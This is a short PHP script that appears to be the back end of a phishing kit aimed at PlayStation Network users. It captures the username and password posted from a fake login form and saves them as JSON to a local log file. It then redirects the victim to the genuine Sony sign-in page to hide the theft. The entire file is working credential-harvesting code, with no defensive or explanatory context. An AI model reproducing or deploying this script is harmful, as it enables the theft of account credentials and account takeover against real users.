<?php

header('Location: https://id.sonyentertainmentnetwork.com/signin/?#/signin?entry=%2Fsignin/');
$data = array('site' => 'Playstation',
  'user' => $_POST['username'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>